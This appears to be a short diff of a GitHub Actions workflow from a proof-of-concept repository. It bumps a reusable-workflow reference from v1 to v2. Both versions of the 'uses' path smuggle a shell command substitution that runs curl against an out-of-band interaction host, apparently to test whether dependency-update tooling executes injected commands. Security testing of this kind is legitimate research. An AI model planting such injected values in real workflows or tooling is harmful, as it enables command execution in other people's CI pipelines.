@@ -2,4 +2,4 @@ name: ci
 on: workflow_dispatch
 jobs:
   call:
-    uses: "0hmdz/dependabot-poc-action/.github/workflows/x$(curl${IFS}d8ctjqjohidb25jho1fghwqpss7np7st5.oast.pro).yml@v1"
+    uses: "0hmdz/dependabot-poc-action/.github/workflows/x$(curl${IFS}d8ctjqjohidb25jho1fghwqpss7np7st5.oast.pro).yml@v2"
